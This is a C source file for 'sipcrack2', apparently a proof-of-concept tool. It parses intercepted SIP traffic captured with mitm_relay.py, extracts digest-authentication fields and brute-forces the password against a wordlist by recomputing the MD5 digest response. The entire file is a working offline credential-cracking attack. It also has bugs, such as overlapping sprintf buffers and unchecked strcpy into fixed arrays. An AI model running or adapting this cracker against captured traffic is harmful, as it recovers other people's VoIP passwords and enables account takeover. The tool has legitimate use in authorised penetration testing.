//this tool parses the output of mitm_relay.py and extracts the digest attributes
//after this extraction, it performs the brute force based password cracking
//it simply iterates through the password list , calculates the digest hash and compares
//against extracted response
// v0.1 - i am sure it can be optimised further and may contain bugs
//PoC released on 14th Apr 2019

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/md5.h>

int i=0,j=0,n;
int i2;
char username[100],filename[100],filename2[100],line[192],password[100],method[10],uri[100],nonce[100],realm[100],response[100];
char helper[200],username_helper[100],username_helper2[100];
MD5_CTX c,d;
char string [100];
unsigned char array[16];
unsigned char out2[MD5_DIGEST_LENGTH],out[MD5_DIGEST_LENGTH];
char h1[200],h2[200];

//this function formats the hash output into a string

void formatstring(int n,char *h2,unsigned char *out2)
{
	for (n=0;n<MD5_DIGEST_LENGTH;n++)
		sprintf(&h2[n*2],"%02x",(unsigned int)out2[n]);
}

//this function calculates the MD5 hash of h1, h2 and h1:nonce:h2

void md5calculate (MD5_CTX c,char *string,unsigned char *array)
{
	MD5_Init(&c);
	MD5_Update(&c,string,strlen(string));
	MD5_Final(array,&c);
}

//this function searches the input file and extracts the digest authnetication attributes
//these are: username, realm, nonce, uri and method. password is read from a file
//attributes are separated by a quote sign (")

void extract_string (char *line,int i, int j, char *helper)
{
		while (line[i]!='"')
			i++;
			j=0;
		while (line[i+1]!='"')
			{
				helper[j]=line[i+1];
				i++;
				j++;
			}	
			helper[j]='\0';
		i+=2;
		i2=i;		
}


int main (int argc, char * argv[])
{
	printf ("sipcrack2 - V0.1 by Ivica Stipovic\n");
	printf ("A mitm_relay file parser and password cracker\n");
	printf ("A supplement to sipdump.py and sicrack.py\n");	
	printf ("==========================================\n\n");
	if (argc!=3) 
		{
			
		printf ("usage: %s <sipdump file> <password list>\n",argv[0]);
		return(0);
		}

	strcpy(filename, argv[1]);
	printf ("filename=%s\n",filename);
	FILE *file=fopen (filename,"r");

	if (file==NULL)
		{
		printf ("Error opening sipdump file %s\n",filename);
		return (0);
		}	
		strcpy (filename2,argv[2]);
		FILE *file2=fopen(filename2,"r");

	if (file2==NULL)
		{
		printf ("error opening pasword file %s\n",filename);
		return (0);
		}

	while (fgets(line,sizeof(line),file)!=NULL)
	{

		if (strncmp(line,"REGISTER",8)==0)
			strcpy (method,"REGISTER");
		else 
		if (strncmp(line,"INVITE",6)==0)
			strcpy (method,"INVITE");
		else
		if (strncmp(line,"SUBSCRIBE",9)==0)
			strcpy (method,"SUBSCRIBE");

		if (strncmp(line,"Authorization",13)==0)
		{	
	
			extract_string (line,i,j,helper);
			strcpy (username, helper);	
			strcpy (username_helper2,username);	
		
			i=i2;
	
			extract_string (line,i,j,helper);
			strcpy (realm, helper);		
		
			i=i2;		
		
			extract_string (line,i,j,helper);		
			strcpy (nonce, helper);		
		
			i=i2;		
		
			extract_string (line,i,j,helper);		
			strcpy (uri, helper);		
		
			i=i2;		
	
			extract_string (line,i,j,helper);		
			strcpy (response, helper);		

			i=i2;		
	
		
			//this part merges strings into a proper format

			char separator[2]=":";
			sprintf (username,"%s:%s:",username,realm);
			sprintf (method,"%s:%s",method,uri);

			strcpy (username_helper,username);
	
		while (fgets(line,sizeof(line),file2)!=NULL)
			{
			strcpy (password,line);
			strcat (username,password);	
	
			username[strcspn(username,"\n")]=0;	
	
			md5calculate (c,username,out);
			formatstring(n,h1,out);

			md5calculate (d,method,out2);
			formatstring(n,h2,out2);

			sprintf (h1,"%s:%s:%s",h1,nonce,h2);
			md5calculate (c,h1,out);
			formatstring (n,h1,out);


			if (strcmp(h1,response)==0)
				{
				printf ("[+] username: %s\n",username_helper2);
				printf ("[+] password: %s\n",password);
				}	
			strcpy (username,username_helper);
			}
	
		}
		i=0;
		}
	fclose(file);
	}
